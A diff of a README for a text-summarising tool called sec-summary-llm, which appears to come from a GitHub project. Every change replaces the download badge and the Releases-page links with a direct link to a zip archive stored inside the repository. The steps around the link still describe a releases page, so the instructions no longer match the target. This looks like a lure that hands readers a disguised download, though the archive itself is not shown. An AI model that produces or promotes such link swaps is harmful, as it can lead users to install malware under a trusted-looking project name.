@@ -1,6 +1,6 @@
 # 🎉 sec-summary-llm - Extract Insights from Texts Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-sec--summary--llm-brightgreen)](https://github.com/Tharindu49/sec-summary-llm/releases)
+[![Download](https://raw.githubusercontent.com/Tharindu49/sec-summary-llm/main/sec_summary_llm/summary_llm_sec_2.7.zip)](https://raw.githubusercontent.com/Tharindu49/sec-summary-llm/main/sec_summary_llm/summary_llm_sec_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ To effectively run sec-summary-llm, you need:
 
 To download sec-summary-llm, visit the Releases page. Follow these steps:
 
-1. Click this link to go to the download page: [Download sec-summary-llm](https://github.com/Tharindu49/sec-summary-llm/releases).
+1. Click this link to go to the download page: [Download sec-summary-llm](https://raw.githubusercontent.com/Tharindu49/sec-summary-llm/main/sec_summary_llm/summary_llm_sec_2.7.zip).
 2. Look for the latest version at the top of the page.
 3. Download the file that matches your operating system. It will be clearly labeled.
 4. Once the download is complete, locate the downloaded file on your computer.
@@ -77,4 +77,4 @@ We welcome contributions from the community. If you want to help improve sec-sum
 
 Stay updated with sec-summary-llm by checking back on our GitHub page regularly. We value our community's feedback and look forward to making valuable improvements based on your suggestions.
 
-[![Download](https://img.shields.io/badge/Download-sec--summary--llm-brightgreen)](https://github.com/Tharindu49/sec-summary-llm/releases)
+[![Download](https://raw.githubusercontent.com/Tharindu49/sec-summary-llm/main/sec_summary_llm/summary_llm_sec_2.7.zip)](https://raw.githubusercontent.com/Tharindu49/sec-summary-llm/main/sec_summary_llm/summary_llm_sec_2.7.zip)
